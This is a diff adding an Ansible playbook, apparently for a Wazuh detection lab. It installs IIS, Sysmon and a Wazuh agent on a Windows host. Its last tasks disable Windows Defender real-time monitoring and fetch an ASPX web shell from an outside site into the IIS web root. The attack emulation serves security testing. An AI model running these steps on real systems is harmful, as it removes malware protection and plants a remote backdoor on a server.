@@ -1,0 +1,100 @@
+---
+- name: Instalar IIS
+  hosts: Windows-Agente
+  gather_facts: false
+  #become: true
+  tasks:
+    - name: Instalar IIS y características requeridas
+      win_feature:
+        name:
+          - Web-Server            # IIS
+          - Web-WebServer         # Web Server
+          - Web-Common-Http       # Common HTTP Features
+          - Web-Default-Doc       # Default Document
+          - Web-Dir-Browsing      # Directory Browsing
+          - Web-Http-Errors       # HTTP Errors
+          - Web-Static-Content    # Static Content
+          - Web-Health            # Health and Diagnostics
+          - Web-Http-Logging      # HTTP Logging
+          #- Web-Log-Libraries     # Logging Tools
+          #- Web-Request-Monitor   # Request Monitor
+          #- Web-Http-Tracing      # Tracing
+          - Web-Performance       # Performance Features
+          - Web-Stat-Compression  # Static Content Compression
+          - Web-Security          # Security Features
+          - Web-Filtering         # Request Filtering
+          #- Web-Basic-Auth        # Basic Authentication
+          #- Web-Windows-Auth      # Windows Authentication
+          - Web-App-Dev           # Application Development
+          - Web-Net-Ext           # .NET Extensibility
+          - Web-Net-Ext45         # .NET Extensibility 4.5
+          - Web-ASP               # ASP
+          - Web-ASP-Net           # ASP.NET
+          - Web-ASP-Net45         # ASP.NET 4.5
+          #- Web-CGI               # CGI
+          - Web-ISAPI-Ext         # ISAPI Extensions
+          - Web-ISAPI-Filter      # ISAPI Filters
+          - Web-Mgmt-Tools        # Management Tools
+          - Web-Mgmt-Console      # IIS Management Console
+        state: present
+
+    - name: Ensure Temp Directory Exists
+      win_file:
+        path: C:\Temp
+        state: directory
+
+    - name: Download Sysmon
+      win_get_url:
+        url: https://download.sysinternals.com/files/Sysmon.zip
+        dest: C:\Temp\Sysmon.zip
+
+    - name: Download Sysmon Configuration
+      win_get_url:
+        url: https://wazuh.com/resources/blog/emulation-of-attack-techniques-and-detection-with-wazuh/sysmonconfig.xml
+        dest: C:\Temp\sysmonconfig.xml
+
+    - name: Unzip Sysmon
+      win_unzip:
+        src: C:\Temp\Sysmon.zip
+        dest: C:\Temp
+        creates: C:\Temp\Sysmon.exe
+
+    - name: Install Sysmon with Configuration
+      win_shell: |
+        C:\Temp\Sysmon.exe -accepteula -i C:\Temp\sysmonconfig.xml
+      args:
+        creates: C:\Windows\Sysmon.exe
+
+    - name: Clean Up Sysmon Zip
+      win_file:
+        path: C:\Temp\Sysmon.zip
+        state: absent
+
+    - name: Clean Up Sysmon Config
+      win_file:
+        path: C:\Temp\sysmonconfig.xml
+        state: absent
+
+    - name: Clean Up Sysmon Exe
+      win_file:
+        path: C:\Temp\Sysmon.exe
+        state: absent
+
+    - name: Copiar archivo configuración agente a la máquina remota
+      win_copy:
+        src: ./scripts_ansible/ossec.conf.windows
+        dest: 'C:\Program Files (x86)\ossec-agent\ossec.conf'
+
+    - name: Reiniciar agente Wazuh
+      win_service:
+        name: wazuh
+        state: restarted
+
+    - name: Disable Windows Defender Real-time Monitoring
+      win_shell: Set-MpPreference -DisableRealtimeMonitoring $true
+
+    - name: Download webshell.aspx
+      win_shell: Invoke-WebRequest -OutFile 'C:\Users\Public\Downloads\webshell.aspx' -Uri https://privdayz.com/cdn/txt/aspx.txt
+
+    - name: Copy webshell.aspx to wwwroot
+      win_shell: copy 'C:\Users\Public\Downloads\webshell.aspx' 'C:\inetpub\wwwroot\webshell.aspx'
